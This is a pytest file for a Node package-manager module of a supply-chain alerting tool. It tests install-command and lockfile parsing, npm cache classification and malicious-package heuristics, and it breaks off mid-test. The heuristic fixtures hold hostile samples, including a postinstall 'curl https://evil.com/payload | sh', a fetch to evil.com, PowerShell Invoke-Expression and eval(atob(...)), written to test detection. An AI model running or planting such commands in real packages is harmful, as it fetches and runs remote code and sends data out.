"""Tests for packagealert/languages/node.py — NodeLanguage contract."""
from __future__ import annotations

import json
import os
from pathlib import Path
from typing import cast
from unittest.mock import patch

import httpx
import pytest

from packagealert.languages import node as _node
from packagealert.languages.base import CURRENT_CONTRACT_VERSION, SandboxPaths, Snapshot
from packagealert.languages.node import NodeLanguage

# Captured at import, before the autouse fixture points _user_npmrc at a missing file: a test
# that needs the real lookup restores just this, keeping the fixture's other isolation.
_REAL_USER_NPMRC = _node._user_npmrc

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def lang() -> NodeLanguage:
    return NodeLanguage()


# ---------------------------------------------------------------------------
# Identity
# ---------------------------------------------------------------------------

def test_identity(lang: NodeLanguage) -> None:
    assert lang.name == "node"
    assert "npm" in lang.ecosystems
    assert "npm" in lang.process_names
    assert "node" in lang.process_names
    assert "yarn" in lang.process_names
    assert "pnpm" in lang.process_names
    assert lang.contract_version == CURRENT_CONTRACT_VERSION


# ---------------------------------------------------------------------------
# parse_process_install
# ---------------------------------------------------------------------------

def test_parse_npm_install(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express"])
    assert install is not None
    assert any(p.name == "express" for p in install.packages)


def test_parse_npm_install_with_version(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express@4.18.0"])
    assert install is not None
    assert any(p.name == "express" and p.version == "4.18.0" for p in install.packages)


def test_parse_scoped_package(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "@babel/core@7.0.0"])
    assert install is not None
    assert any(p.name == "@babel/core" and p.version == "7.0.0" for p in install.packages)


def test_parse_scoped_package_no_version(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "@babel/core"])
    assert install is not None
    assert any(p.name == "@babel/core" and p.version is None for p in install.packages)


def test_parse_npm_ecosystem(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express"])
    assert install is not None
    assert all(p.ecosystem == "npm" for p in install.packages)


def test_parse_npm_names_are_lowercase(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "Express@4.18.0"])
    assert install is not None
    assert all(p.name == p.name.lower() for p in install.packages)


def test_parse_args_returns_none_for_unknown_manager(lang: NodeLanguage) -> None:
    assert lang.parse_process_install(["pip", "install", "x"]) is None


def test_parse_args_returns_none_for_empty_list(lang: NodeLanguage) -> None:
    assert lang.parse_process_install([]) is None


def test_parse_npm_add(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "add", "lodash"])
    assert install is not None
    assert any(p.name == "lodash" for p in install.packages)


def test_parse_npm_multiple_packages(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express", "lodash"])
    assert install is not None
    names = {p.name for p in install.packages}
    assert "express" in names
    assert "lodash" in names


def test_parse_npm_defers_to_lockfile(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express"])
    assert install is not None
    assert install.defer_to_lockfile is True
    assert install.manager == "npm"
    assert install.lockfile_hint == "package-lock.json"


def test_parse_yarn_add(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["yarn", "add", "lodash"])
    assert install is not None
    assert install.manager == "yarn"
    assert any(p.name == "lodash" for p in install.packages)
    assert install.defer_to_lockfile is True
    assert install.lockfile_hint == "yarn.lock"


def test_parse_yarn_install(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["yarn", "install"])
    assert install is not None
    assert install.manager == "yarn"
    assert install.packages == []
    assert install.defer_to_lockfile is True


def test_parse_pnpm_add(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["pnpm", "add", "express"])
    assert install is not None
    assert install.manager == "pnpm"
    assert any(p.name == "express" for p in install.packages)
    assert install.defer_to_lockfile is True
    assert install.lockfile_hint == "pnpm-lock.yaml"


def test_parse_pnpm_install(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["pnpm", "install"])
    assert install is not None
    assert install.manager == "pnpm"
    assert install.packages == []


def test_npx_not_in_process_names(lang: NodeLanguage) -> None:
    assert "npx" not in lang.process_names


# ---------------------------------------------------------------------------
# parse_lockfile
# ---------------------------------------------------------------------------

def test_parse_package_lock(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "lockfileVersion": 2,
        "packages": {
            "": {"name": "my-app", "version": "1.0.0"},
            "node_modules/express": {"version": "4.18.0"},
            "node_modules/lodash": {"version": "4.17.21"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    names = {p.name for p in result}
    assert "express" in names
    assert "lodash" in names
    # Root entry (empty key) should be skipped
    assert "" not in names
    versions = {p.name: p.version for p in result}
    assert versions["express"] == "4.18.0"
    assert versions["lodash"] == "4.17.21"


def test_parse_lockfile_strips_node_modules_prefix(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "packages": {
            "node_modules/react": {"version": "18.2.0"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    assert any(p.name == "react" for p in result)
    # Should NOT have "node_modules/react" as a name
    assert not any("node_modules" in p.name for p in result)


def test_parse_lockfile_nested_node_modules_path(lang: NodeLanguage, tmp_path: Path) -> None:
    """v2/v3 lock files can have nested keys like node_modules/react/node_modules/scheduler.
    The name field should be used when present; otherwise the last segment after node_modules/
    is extracted so the result is a valid package name, not a path fragment."""
    lock_data = {
        "packages": {
            "node_modules/react": {"version": "18.2.0"},
            "node_modules/react/node_modules/scheduler": {
                "version": "0.23.0",
                "name": "scheduler",
            },
            # No name field — fall back to last-segment extraction
            "node_modules/jest/node_modules/jest-circus": {"version": "29.0.0"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    names = {p.name for p in result}
    assert names == {"react", "scheduler", "jest-circus"}
    assert not any("node_modules" in n for n in names)


def test_parse_lockfile_ecosystem_is_npm(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {"packages": {"node_modules/x": {"version": "1.0.0"}}}
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    assert all(p.ecosystem == "npm" for p in result)


def test_parse_lockfile_returns_empty_for_unknown_filename(lang: NodeLanguage, tmp_path: Path) -> None:
    wrong_file = tmp_path / "requirements.txt"
    wrong_file.write_text("requests==2.31.0\n")
    assert lang.parse_lockfile(wrong_file) == []


def test_parse_lockfile_returns_empty_on_invalid_json(lang: NodeLanguage, tmp_path: Path) -> None:
    bad_file = tmp_path / "package-lock.json"
    bad_file.write_text("not valid json {{{")
    assert lang.parse_lockfile(bad_file) == []


def test_parse_lockfile_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "packages": {
            "node_modules/@babel/core": {"version": "7.22.0"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    assert any(p.name == "@babel/core" for p in result)


def test_parse_lockfile_v1_format(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "name": "myapp",
        "lockfileVersion": 1,
        "dependencies": {
            "express": {"version": "4.18.0", "resolved": "..."},
            "lodash": {"version": "4.17.21", "resolved": "..."},
        }
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    names = {p.name for p in result}
    assert "express" in names
    assert "lodash" in names


def test_parse_package_lock_v1_per_entry_dev_flag(lang: NodeLanguage, tmp_path: Path) -> None:
    # v1 entries can carry a "dev": true flag; this takes precedence over the root
    # devDependencies list, allowing transitive dev deps to be classified correctly.
    lock_data = {
        "name": "myapp",
        "lockfileVersion": 1,
        "devDependencies": {"jest": "^29.0.0"},
        "dependencies": {
            "express": {"version": "4.18.0"},
            "jest": {"version": "29.0.0", "dev": True},
            "jest-circus": {"version": "29.0.0", "dev": True},  # transitive — not in devDependencies
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True
    assert by_name["jest-circus"].is_dev is True  # classified via per-entry flag, not devDependencies


def test_parse_package_lock_v1_prod_wins_when_in_both(lang: NodeLanguage, tmp_path: Path) -> None:
    # A package listed in root devDependencies but with "dev": false on its entry
    # (prod context wins) should be classified as prod.
    lock_data = {
        "name": "myapp",
        "lockfileVersion": 1,
        "devDependencies": {"debug": "^4.0.0"},
        "dependencies": {
            "debug": {"version": "4.3.4", "dev": False},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["debug"].is_dev is False


def test_parse_yarn_lock(lang: NodeLanguage, tmp_path: Path) -> None:
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text(
        '# yarn lockfile v1\n\n'
        'lodash@^4.17.0:\n'
        '  version "4.17.21"\n'
        '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"\n'
        '  integrity sha512-abc\n'
        '\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
        '  resolved "https://registry.yarnpkg.com/express/-/express-4.18.2.tgz"\n'
        '  integrity sha512-def\n'
    )
    result = lang.parse_lockfile(yarn_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "express" in names
    versions = {p.name: p.version for p in result}
    assert versions["lodash"] == "4.17.21"
    assert versions["express"] == "4.18.2"
    assert all(p.ecosystem == "npm" for p in result)


def test_parse_yarn_lock_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text(
        '# yarn lockfile v1\n\n'
        '"@babel/core@^7.0.0":\n'
        '  version "7.22.0"\n'
        '  resolved "https://registry.yarnpkg.com/@babel/core/-/core-7.22.0.tgz"\n'
        '  integrity sha512-abc\n'
    )
    result = lang.parse_lockfile(yarn_lock)
    assert any(p.name == "@babel/core" and p.version == "7.22.0" for p in result)


def test_parse_yarn_lock_comma_separated_selectors(lang: NodeLanguage, tmp_path: Path) -> None:
    # Multiple version ranges resolving to the same package appear on one header line.
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text(
        '# yarn lockfile v1\n\n'
        '"@babel/core@^7.0.0", "@babel/core@^7.1.0":\n'
        '  version "7.22.0"\n'
        '  resolved "https://registry.yarnpkg.com/@babel/core/-/core-7.22.0.tgz"\n'
        '  integrity sha512-abc\n'
    )
    result = lang.parse_lockfile(yarn_lock)
    # Should produce exactly one entry, not two
    assert len(result) == 1
    assert result[0].name == "@babel/core"
    assert result[0].version == "7.22.0"


def test_parse_yarn_lock_empty_returns_empty(lang: NodeLanguage, tmp_path: Path) -> None:
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text("# yarn lockfile v1\n")
    result = lang.parse_lockfile(yarn_lock)
    assert result == []


def test_parse_pnpm_lock(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '6.0'\n"
        "\n"
        "packages:\n"
        "  lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-abc}\n"
        "    engines: {node: '>=0'}\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-def}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "express" in names
    versions = {p.name: p.version for p in result}
    assert versions["lodash"] == "4.17.21"
    assert versions["express"] == "4.18.2"
    assert all(p.ecosystem == "npm" for p in result)
    # No importers: section — dev/prod undetectable
    assert all(p.is_dev is None for p in result)


def test_parse_pnpm_lock_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '6.0'\n"
        "\n"
        "packages:\n"
        "  '@babel/core@7.22.0':\n"
        "    resolution: {integrity: sha512-abc}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    assert len(result) == 1
    assert result[0].name == "@babel/core"
    assert result[0].version == "7.22.0"
    assert result[0].ecosystem == "npm"


def test_parse_pnpm_lock_stops_at_next_section(lang: NodeLanguage, tmp_path: Path) -> None:
    # Lines in other top-level sections (e.g. "snapshots:") should not be parsed.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '6.0'\n"
        "\n"
        "packages:\n"
        "  lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-abc}\n"
        "\n"
        "snapshots:\n"
        "  notapackage@9.9.9:\n"
        "    dependencies:\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "notapackage" not in names


def test_parse_pnpm_lock_empty_returns_empty(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text("lockfileVersion: '6.0'\n")
    assert lang.parse_lockfile(pnpm_lock) == []


def test_parse_pnpm_lock_v6_slash_prefix(lang: NodeLanguage, tmp_path: Path) -> None:
    # pnpm v6 lockfile uses leading '/' on package keys: /lodash@4.17.21:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: 5.4\n"
        "\n"
        "packages:\n"
        "  /lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-abc}\n"
        "  /express@4.18.2:\n"
        "    resolution: {integrity: sha512-def}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "express" in names
    versions = {p.name: p.version for p in result}
    assert versions["lodash"] == "4.17.21"
    assert versions["express"] == "4.18.2"


def test_parse_pnpm_lock_v6_scoped_slash_prefix(lang: NodeLanguage, tmp_path: Path) -> None:
    # pnpm v6 scoped packages: /@babel/core@7.22.0:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: 5.4\n"
        "\n"
        "packages:\n"
        "  /@babel/core@7.22.0:\n"
        "    resolution: {integrity: sha512-abc}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    assert len(result) == 1
    assert result[0].name == "@babel/core"
    assert result[0].version == "7.22.0"


def test_parse_pnpm_lock_peer_dep_suffix_stripped(lang: NodeLanguage, tmp_path: Path) -> None:
    # Keys with peer-dependency suffixes: /@babel/core@7.20.0(@types/node@18.0.0):
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: 5.4\n"
        "\n"
        "packages:\n"
        "  /@babel/core@7.20.0(@types/node@18.0.0):\n"
        "    resolution: {integrity: sha512-abc}\n"
        "  /lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-def}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p.version for p in result}
    assert by_name["@babel/core"] == "7.20.0"
    assert by_name["lodash"] == "4.17.21"


# ---------------------------------------------------------------------------
# cache_paths
# ---------------------------------------------------------------------------

def test_cache_paths(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert len(paths) >= 1
    assert any("npm" in str(p) for p in paths)


def test_cache_paths_returns_path_objects(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert all(isinstance(p, Path) for p in paths)


def test_cache_paths_points_to_index_v5(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert all("index-v5" in str(p) for p in paths)


def test_cache_paths_does_not_watch_content_v2(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert not any("content-v2" in str(p) for p in paths)


def test_cache_file_globs_targets_fixed_depth(lang: NodeLanguage) -> None:
    # index-v5 entries live at exactly two bucket levels — the glob must not
    # recurse deeper (avoid classifying directories or unrelated nested paths).
    globs = lang.cache_file_globs()
    assert len(globs) == 1
    glob = globs[0]
    # Must match an entry at the two-bucket-level path
    from pathlib import PurePosixPath
    assert PurePosixPath("ab/cd/somehashfile").match(glob)
    # Must not use an open-ended recursive pattern
    assert "**" not in glob


# ---------------------------------------------------------------------------
# classify_cache_file
# ---------------------------------------------------------------------------

def _make_index_entry(tmp_path: Path, key: str, subdir: str = "ab/cd") -> Path:
    """Write a minimal npm index-v5 cache entry file."""
    d = tmp_path / subdir
    d.mkdir(parents=True, exist_ok=True)
    f = d / "entry"
    payload = json.dumps({"key": key, "integrity": "sha512-abc"})
    f.write_text(f"deadbeef\t{payload}\n")
    return f


def test_classify_cache_file_plain_package(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "lodash"
    assert result.version == "4.17.21"
    assert result.ecosystem == "npm"


def test_classify_cache_file_scoped_package_url_encoded(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/%40babel%2Fcore/-/core-7.22.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "@babel/core"
    assert result.version == "7.22.0"


def test_classify_cache_file_scoped_package_plain_url(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.example.com/npm/QA/@babel/plugin-proposal-private-methods/-/plugin-proposal-private-methods-7.18.6.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "@babel/plugin-proposal-private-methods"
    assert result.version == "7.18.6"


def test_classify_cache_file_scoped_package_uppercase_encoding(lang: NodeLanguage, tmp_path: Path) -> None:
    # %2f (lowercase) instead of %2F — old manual replace() was case-sensitive and missed this
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/%40babel%2fcore/-/core-7.22.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "@babel/core"


def test_classify_cache_file_encoded_slash_in_unscoped_name_rejected(lang: NodeLanguage, tmp_path: Path) -> None:
    # 'evil%2Fpkg' decodes to 'evil/pkg' — not a valid unscoped name; must return None
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/evil%2Fpkg/-/pkg-1.0.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is None


def test_classify_cache_file_encoded_slash_in_scoped_name_extra_slash_rejected(lang: NodeLanguage, tmp_path: Path) -> None:
    # '@scope%2Fextra/pkg' decodes to '@scope/extra/pkg' — two slashes, invalid scoped name
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/%40scope%2Fextra%2Fpkg/-/pkg-1.0.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is None


def test_classify_cache_file_uses_last_line(lang: NodeLanguage, tmp_path: Path) -> None:
    d = tmp_path / "ab" / "cd"
    d.mkdir(parents=True)
    f = d / "entry"
    old_key = "make-fetch-happen:request-cache:https://registry.npmjs.org/old-pkg/-/old-pkg-1.0.0.tgz"
    new_key = "make-fetch-happen:request-cache:https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    f.write_text(
        f"aaa\t{json.dumps({'key': old_key})}\n"
        f"bbb\t{json.dumps({'key': new_key})}\n"
    )
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "lodash"


def test_classify_cache_file_wrong_bucket_depth_skipped(lang: NodeLanguage, tmp_path: Path) -> None:
    """Files not in exactly a two-level hex-bucket dir are rejected before any file I/O."""
    # One level deep — should be skipped
    shallow = tmp_path / "ab" / "entry"
    shallow.parent.mkdir(parents=True)
    shallow.write_text("this would parse but should never be read\n")
    assert lang.classify_cache_file(shallow) is None

    # Non-hex parent name
    non_hex = tmp_path / "requests" / "cd" / "entry"
    non_hex.parent.mkdir(parents=True)
    non_hex.write_text("irrelevant\n")
    assert lang.classify_cache_file(non_hex) is None

    # Three levels deep — still has two hex parents but is too deep to be index-v5
    too_deep = tmp_path / "ab" / "cd" / "ef" / "entry"
    too_deep.parent.mkdir(parents=True)
    too_deep.write_text("irrelevant\n")
    assert lang.classify_cache_file(too_deep) is None

    # File with an extension (e.g. a wheel or tarball in another cache)
    with_ext = tmp_path / "ab" / "cd" / "some-package.whl"
    with_ext.parent.mkdir(parents=True, exist_ok=True)
    with_ext.write_text("irrelevant\n")
    assert lang.classify_cache_file(with_ext) is None


def test_classify_cache_file_non_tgz_key_returns_none(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/lodash"
    f = _make_index_entry(tmp_path, key)
    assert lang.classify_cache_file(f) is None


def test_classify_cache_file_unreadable_returns_none(lang: NodeLanguage, tmp_path: Path) -> None:
    assert lang.classify_cache_file(tmp_path / "nonexistent") is None


def test_classify_cache_file_invalid_json_returns_none(lang: NodeLanguage, tmp_path: Path) -> None:
    d = tmp_path / "ab" / "cd"
    d.mkdir(parents=True)
    f = d / "entry"
    f.write_text("deadbeef\tnot-json\n")
    assert lang.classify_cache_file(f) is None


def test_classify_cache_file_private_registry(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://mycompany.jfrog.io/npm/read-pkg/-/read-pkg-1.1.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "read-pkg"
    assert result.version == "1.1.0"


# ---------------------------------------------------------------------------
# heuristics — async
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_heuristic_detects_install_script(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node ./setup.js"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    heuristics = lang.heuristics()
    assert heuristics
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "install_script" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_curl_in_script(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://evil.com/payload | sh"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    signal_names = {s.name for s in signals}
    assert "install_script" in signal_names
    assert "curl_in_script" in signal_names


@pytest.mark.asyncio
async def test_heuristic_detects_powershell_in_script(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "powershell.exe -Command \"Invoke-Expression\""
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "powershell_in_script" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_eval(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("eval(atob('aGVsbG8='));\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "eval_usage" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_child_process(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("const cp = require('child_process');\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "child_process" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_network_access(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("fetch('https://evil.com/data');\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "network_access" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_credential_access(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("const home = process.env.HOME;\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "credential_access" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_clean_package_no_signals(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "clean-pkg",
        "version": "1.0.0",
        "scripts": {
            "test": "jest"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("module.exports = { hello: () => 'world' };\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert signals == []


@pytest.mark.asyncio
async def test_heuristic_no_package_json_no_signals(lang: NodeLanguage, tmp_path: Path) -> None:
    # Directory without package.json should yield no signals
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert signals == []


# ---------------------------------------------------------------------------
# lockfile_patterns
# ---------------------------------------------------------------------------

def test_lockfile_patterns(lang: NodeLanguage) -> None:
    patterns = lang.lockfile_patterns()
    assert "package-lock.json" in patterns
    assert "yarn.lock" in patterns
    assert "pnpm-lock.yaml" in patterns


# ---------------------------------------------------------------------------
# detect_installed_packages
# ---------------------------------------------------------------------------

def test_detect_installed_reads_top_level_and_scoped_packages(lang: NodeLanguage, tmp_path: Path) -> None:
    node_modules = tmp_path / "node_modules"
    for rel, name in (("express", "express"), ("@babel/core", "@babel/core")):
        (node_modules / rel).mkdir(parents=True)
        (node_modules / rel / "package.json").write_text(json.dumps({"name": name, "version": "4.18.0"}))

    result = lang.detect_installed_packages(tmp_path)

    assert sorted((p.name, p.version, p.ecosystem) for p in result) == [
        ("@babel/core", "4.18.0", "npm"), ("express", "4.18.0", "npm")]


def test_detect_installed_empty_if_no_node_modules(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.detect_installed_packages(tmp_path)
    assert result == []


def test_detect_installed_walks_every_copy_without_asking_npm(lang: NodeLanguage, tmp_path: Path) -> None:
    """Hoisted, nested and pnpm store copies, each name and version once, named as the
    manifest declares (an alias is its package); a linked workspace is not installed (#106)."""
    nm = _nested_layout(tmp_path)
    (nm / "ms-new").mkdir()
    (nm / "ms-new" / "package.json").write_text(json.dumps({"name": "ms", "version": "2.2.0"}))
    store = nm / ".pnpm" / "evilpkg@1.0.0" / "node_modules"
    (store / "evilpkg").mkdir(parents=True)
    (store / "evilpkg" / "package.json").write_text(json.dumps({"name": "evilpkg", "version": "1.0.0"}))
    (store / "ms").symlink_to(nm / "ms")                       # a store entry's dependency is a link
    (tmp_path / "ws").mkdir()
    (tmp_path / "ws" / "package.json").write_text(json.dumps({"name": "ws", "version": "0.0.1"}))
    (nm / "ws").symlink_to(tmp_path / "ws")

    with patch("subprocess.check_output", side_effect=AssertionError("npm ls must not be run")):
        result = lang.detect_installed_packages(tmp_path)

    assert sorted((p.name, p.version) for p in result) == [
        ("@babel/code-frame", "7.0.0"), ("@babel/highlight", "7.0.0"), ("@babel/highlight", "7.24.7"),
        ("a", "1.0.0"), ("b", "1.0.0"), ("c", "1.0.0"), ("debug", "4.3.4"), ("evilpkg", "1.0.0"),
        ("ms", "2.0.0"), ("ms", "2.1.2"), ("ms", "2.1.3"), ("ms", "2.2.0")]


def test_detect_installed_judges_each_copy_by_its_lock_entry(lang: NodeLanguage, tmp_path: Path, monkeypatch) -> None:
    """A version only installed from a file: tarball (npm's lock) or a file: store entry is
    not looked up by name; one also installed from the registry is."""
    from packagealert.parsers.lockfiles import scan_installed

    monkeypatch.delenv("npm_config_registry", raising=False)
    nm = _nested_layout(tmp_path)
    (tmp_path / "package.json").write_text(json.dumps({"name": "proj", "dependencies": {"a": "1.0.0", "c": "1.0.0"}}))
    reg = "https://registry.npmjs.org/"
    (nm / ".package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "node_modules/a/node_modules/b/node_modules/ms": {"version": "2.1.3", "resolved": "file:../vendor/ms-2.1.3.tgz"},
        "node_modules/c/node_modules/ms": {"version": "2.1.2", "resolved": "file:../vendor/ms-2.1.2.tgz"},
        "node_modules/debug/node_modules/ms": {"version": "2.1.2", "resolved": reg + "ms/-/ms-2.1.2.tgz"},
    }}))
    local = nm / ".pnpm" / "localpkg@file+..+localpkg-3.0.0.tgz" / "node_modules" / "localpkg"
    local.mkdir(parents=True)
    (local / "package.json").write_text(json.dumps({"name": "localpkg", "version": "3.0.0"}))

    public = {(p.name, p.version): p.from_public_registry for p in lang.detect_installed_packages(tmp_path)}
    assert public[("ms", "2.1.3")] is False and public[("localpkg", "3.0.0")] is False
    assert public[("ms", "2.1.2")] is True            # one copy is the registry's
    assert public[("ms", "2.0.0")] is True            # no lock entry: the configured (public) registry
    pinned = {(p.name, p.version): p.from_public_registry for p in scan_installed(tmp_path).pinned}
